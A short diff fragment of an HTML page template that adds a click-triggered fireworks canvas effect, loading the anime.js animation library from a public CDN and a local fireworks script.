+
+<!-- 页面点击出现烟花 -->
+
+ <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+ <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+ <script type="text/javascript" src="/js/src/fireworks.js"></script>
+
+</body>
+</html>
